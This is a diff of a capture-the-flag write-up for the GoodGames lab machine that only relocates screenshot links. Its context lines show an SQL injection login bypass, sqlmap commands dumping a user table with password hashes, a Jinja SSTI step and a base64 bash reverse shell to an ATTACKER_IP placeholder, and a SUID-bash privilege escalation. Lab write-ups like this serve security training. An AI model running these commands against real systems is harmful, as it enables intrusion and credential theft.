@@ -45,7 +45,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.129.29.40
 ```
 
-![ping](goodgames_01_ping.png)
+![ping](screenshots/goodgames_01_ping.png)
 
 ---
 ### 1.2 Port Scanning
@@ -63,7 +63,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.29.40 -oG allPorts
 - `-Pn` : Skip host discovery  
 - `-oG` : Output in grepable format  
 
-![allports](goodgames_02_nmap_allports.png)
+![allports](screenshots/goodgames_02_nmap_allports.png)
 
 Extract the open ports:
 
@@ -71,7 +71,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![extractports](goodgames_03_extractports.png)
+![extractports](screenshots/goodgames_03_extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -87,7 +87,7 @@ cat targeted
 - `-sV` : Detect service versions  
 - `-oN` : Output in human-readable format  
 
-![targeted 1](goodgames_04_nmap_targeted.png)
+![targeted 1](screenshots/goodgames_04_nmap_targeted.png)
 
 The application stack is Python/Werkzeug-oriented; confirm the HTTP title and server headers with a fingerprinting pass as a sanity check alongside the scripted scan:
 
@@ -95,7 +95,7 @@ The application stack is Python/Werkzeug-oriented; confirm the HTTP title and se
 whatweb http://10.129.29.40/
 ```
 
-![targeted 2 — technology fingerprint](goodgames_05_whatweb.png)
+![targeted 2 — technology fingerprint](screenshots/goodgames_05_whatweb.png)
 
 **Findings:**
 
@@ -120,7 +120,7 @@ Only port 80 is exposed externally, so the next step is to map common routes qui
 ffuf -u http://10.129.29.40/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -ac -fc 404 -t 40
 ```
 
-![ffuf routes](goodgames_06_ffuf_routes.png)
+![ffuf routes](screenshots/goodgames_06_ffuf_routes.png)
 
 ---
 ### 2.2 Authentication surface review (manual / proxy-assisted)
@@ -134,11 +134,11 @@ BurpSuite (or Firefox devtools/network) helps validate how credentials are trans
 
 Manual SQL injection proof (conceptually `email=test@test.com' or 1=1 -- -&password=<anything>`):
 
-![burp SQLi bypass request/response context](goodgames_07_burp_sqli_bypass.png)
+![burp SQLi bypass request/response context](screenshots/goodgames_07_burp_sqli_bypass.png)
 
 Confirm the authenticated session semantics (cookie/session behavior) via the proxy response pane:
 
-![burp set-cookie session](goodgames_08_burp_setcookie_session.png)
+![burp set-cookie session](screenshots/goodgames_08_burp_setcookie_session.png)
 
 ---
 ## 3. Foothold
@@ -159,7 +159,7 @@ Represent the behavior in your notes with a controlled manual request (proxy or 
 
 Browser confirmation after bypass:
 
-![login success](goodgames_08_sqli_login_success.png)
+![login success](screenshots/goodgames_08_sqli_login_success.png)
 
 ---
 ### 3.2 Portal pivot: profile area and secondary vhost
@@ -172,7 +172,7 @@ After authenticating through the flawed login logic, `/profile` shows administra
 # - settings affordance leads to internal-administration.goodgames.htb mapping
 ```
 
-![admin profile page](goodgames_09_admin_profile.png)
+![admin profile page](screenshots/goodgames_09_admin_profile.png)
 
 ---
 ### 3.3 Automated extraction with `sqlmap` (recommended once a raw HTTP request baseline exists)
@@ -187,20 +187,20 @@ Important practical note validated during the solve:
 sqlmap -r goodgames_raw.req -p email --batch --dbms=mysql --level 3 --risk 2 --dbs
 ```
 
-![sqlmap databases](goodgames_10_sqlmap_dbs.png)
+![sqlmap databases](screenshots/goodgames_10_sqlmap_dbs.png)
 
 ```bash
 sqlmap -r goodgames_raw.req -p email --batch --dbms=mysql --level 3 --risk 2 -D main --tables
 ```
 
-![sqlmap tables main](goodgames_11_sqlmap_tables_main.png)
+![sqlmap tables main](screenshots/goodgames_11_sqlmap_tables_main.png)
 
 ```bash
 sqlmap -r goodgames_raw.req -p email --batch --dbms=mysql --level 3 --risk 2 \
   -D main -T user -C email,name,password --dump
 ```
 
-![sqlmap dump main.user](goodgames_12_sqlmap_dump_main_user.png)
+![sqlmap dump main.user](screenshots/goodgames_12_sqlmap_dump_main_user.png)
 
 Recovered materially (examples from the dumped rows): `main.user` contained an administrative email row with an MD5 password hash and a locally-created test user row.
 
@@ -209,15 +209,15 @@ Recovered materially (examples from the dumped rows): `main.user` contained an a
 
 Offline cracking (or CrackStation-style lookup against common MD5 preimages) converts the recovered admin hash into usable credentials for another login surface exposed only on `internal-administration.goodgames.htb`.
 
-![crackstation md5 result](goodgames_13_crackstation_md5_crack.png)
+![crackstation md5 result](screenshots/goodgames_13_crackstation_md5_crack.png)
 
 After logging into the Flask administration UI:
 
-![internal dashboard authenticated](goodgames_14_internal_dashboard.png)
+![internal dashboard authenticated](screenshots/goodgames_14_internal_dashboard.png)
 
 The settings page exposes user-editable fields; `Full Name` is a strong candidate for SSTI testing in Flask/Jinja templating contexts:
 
-![internal settings general information form](goodgames_15_internal_settings_form.png)
+![internal settings general information form](screenshots/goodgames_15_internal_settings_form.png)
 
 Confirm template evaluation with arithmetic first (conceptually `{{7*7}}` → renders as `49` when unsafe rendering is happening), then move to constrained command execution primitives.
 
@@ -233,7 +233,7 @@ echo -ne 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1' | base64
 nc -lvnp <ATTACKER_PORT>
 ```
 
-![ssti to reverse shell (browser payload + nc callback)](goodgames_16_ssti_reverse_shell.png)
+![ssti to reverse shell (browser payload + nc callback)](screenshots/goodgames_16_ssti_reverse_shell.png)
 
 ---
 ## 4. Privilege Escalation
@@ -255,11 +255,11 @@ for PORT in $(seq 1 65535); do
 done
 ```
 
-![container-side mount + pivot evidence](goodgames_13_container_mount_portscan.png)
+![container-side mount + pivot evidence](screenshots/goodgames_13_container_mount_portscan.png)
 
 The user flag is readable from within the mounted home inside the container (evidence artifact during the pivot phase):
 
-![container user.txt read](goodgames_17_container_user_flag.png)
+![container user.txt read](screenshots/goodgames_17_container_user_flag.png)
 
 🏁 **User flag obtained**
 
@@ -269,7 +269,7 @@ Reuse the cracked password suite against SSH for the mapped host user observed o
 ssh augustus@172.19.0.1
 ```
 
-![SSH host enumeration / session context](goodgames_14_ssh_host_enum.png)
+![SSH host enumeration / session context](screenshots/goodgames_14_ssh_host_enum.png)
 
 ---
 ### 4.2 Writable host home + privileged container chmod → root on host
@@ -292,7 +292,7 @@ chown root:root bash
 chmod 4755 bash
 ```
 
-![host copies bash into home prep](goodgames_18_host_copy_bash.png)
+![host copies bash into home prep](screenshots/goodgames_18_host_copy_bash.png)
 
 Return SSH session as `augustus` on the host and validate the SUID bit, then obtain root privileges:
 
@@ -303,7 +303,7 @@ ls -l bash
 id
 ```
 
-![suid bash leads to uid 0 shell / root artifact access](goodgames_15_privesc_suid_bash_root.png)
+![suid bash leads to uid 0 shell / root artifact access](screenshots/goodgames_15_privesc_suid_bash_root.png)
 
 🏁 **Root flag obtained**
 
